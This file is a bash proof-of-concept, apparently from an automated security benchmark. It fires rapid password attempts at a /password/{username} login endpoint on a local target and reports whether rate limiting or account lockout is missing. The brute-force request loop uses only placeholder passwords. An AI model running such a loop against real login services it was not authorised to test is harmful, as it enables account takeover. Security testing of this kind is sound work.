#!/bin/bash
# POC: Demonstrates rapid brute force password attempts without rate limiting on /password/{username} endpoint
# Target: ./repo
# Created: 2025-11-04T20:04:16.055Z
# Session: benchmark-XBEN-027-24-mhkznijf

# Brute Force Protection Testing POC - Improved Version
# Demonstrates lack of rate limiting on password authentication endpoint

TARGET_HOST="${1:-localhost:5000}"
USERNAME="${2:-test}"
NUM_ATTEMPTS="${3:-10}"

echo "[*] Brute Force Protection Test"
echo "[*] Target: http://$TARGET_HOST/password/$USERNAME"
echo "[*] Username: $USERNAME"
echo "[*] Number of attempts: $NUM_ATTEMPTS"
echo "[*] Starting brute force test..."
echo ""

# Track response codes and timing
response_codes=()
response_times=()
start_time=$(date +%s)

# Make rapid password attempts
for i in $(seq 1 $NUM_ATTEMPTS); do
    request_start=$(date +%s%N)
    
    # Attempt with password attempt_$i
    response=$(curl -s -i -X POST \
        "http://$TARGET_HOST/password/$USERNAME" \
        -d "username=$USERNAME&user_id=1&password=attempt_$i" \
        -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
    
    # Extract HTTP status code
    http_code=$(echo "$response" | grep -i "^HTTP" | head -1 | awk '{print $2}')
    
    # If curl failed (no HTTP response), try with verbose to see what's happening
    if [ -z "$http_code" ]; then
        # Try without -i flag
        http_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            "http://$TARGET_HOST/password/$USERNAME" \
            -d "username=$USERNAME&user_id=1&password=attempt_$i" \
            -H "Content-Type: application/x-www-form-urlencoded" 2>&1)
    fi
    
    request_end=$(date +%s%N)
    response_time=$(( (request_end - request_start) / 1000000 ))
    
    response_codes+=("$http_code")
    response_times+=("$response_time")
    
    # Print progress
    printf "\r[+] Attempt %d/%d - HTTP %s - %dms" "$i" "$NUM_ATTEMPTS" "$http_code" "$response_time"
done

end_time=$(date +%s)
total_time=$((end_time - start_time))
if [ "$total_time" -eq 0 ]; then
    total_time=1  # Avoid division by zero
fi

echo ""
echo ""
echo "========== RESULTS =========="
echo "[*] Total attempts: $NUM_ATTEMPTS"
echo "[*] Total time: ${total_time}s"
echo "[*] Attempts per second: $((NUM_ATTEMPTS / total_time))"
echo ""

# Check for rate limiting indicators
unique_codes=$(printf '%s\n' "${response_codes[@]}" | sort -u)
unique_count=$(printf '%s\n' "${response_codes[@]}" | sort -u | wc -l)

echo "[*] Unique HTTP response codes: $unique_count"
echo "[*] Response codes:"
for code in $unique_codes; do
    count=$(printf '%s\n' "${response_codes[@]}" | grep -c "^$code$")
    echo "    - HTTP $code: $count times"
done

echo ""
echo "[*] Response time analysis (milliseconds):"
min_time=$(printf '%s\n' "${response_times[@]}" | sort -n | head -1)
max_time=$(printf '%s\n' "${response_times[@]}" | sort -n | tail -1)
avg_time=0
for time in "${response_times[@]}"; do
    avg_time=$((avg_time + time))
done
avg_time=$((avg_time / NUM_ATTEMPTS))

echo "    - Min: ${min_time}ms"
echo "    - Max: ${max_time}ms"
echo "    - Avg: ${avg_time}ms"

echo ""
echo "========== VULNERABILITY ASSESSMENT =========="

# Check if times are consistent (no exponential backoff)
time_diff=$((max_time - min_time))
if [ "$time_diff" -lt 50 ]; then
    echo "[!] VULNERABLE: Response times are highly consistent (~${min_time}ms-${max_time}ms)"
    echo "    → No exponential backoff or progressive delays detected"
else
    echo "[+] PROTECTED: Significant variation in response times"
    echo "    → Possible backoff/rate limiting in place"
fi

# Check for account lockout (consistent 302 = likely no lockout)
first_code=${response_codes[0]}
all_same=true
for code in "${response_codes[@]}"; do
    if [ "$code" != "$first_code" ]; then
        all_same=false
        break
    fi
done

if [ "$all_same" = true ] && [ "$first_code" = "302" ]; then
    echo "[!] VULNERABLE: All requests returned consistent HTTP 302"
    echo "    → No account lockout detected across all $NUM_ATTEMPTS attempts"
    echo "    → No status change or protection mechanism triggered"
elif [ "$all_same" = true ]; then
    echo "[!] VULNERABLE: All requests returned consistent HTTP $first_code"
    echo "    → Consistent response indicates no progressive protection"
elif [ "$unique_count" -gt 1 ]; then
    echo "[*] PARTIALLY PROTECTED: Multiple response codes received"
    echo "    → Might indicate rate limiting or lockout mechanism"
fi

if [ "$total_time" -le 1 ] && [ "$NUM_ATTEMPTS" -ge 10 ]; then
    echo "[!] VULNERABLE: Extremely high request rate allowed"
    echo "    → $NUM_ATTEMPTS requests completed in ${total_time}s (at least $((NUM_ATTEMPTS / (total_time + 1))) attempts/sec)"
    echo "    → No meaningful rate limiting detected"
fi

echo ""
echo "[*] Test completed."
echo "[*] Conclusion: BRUTE FORCE ATTACK IS FEASIBLE"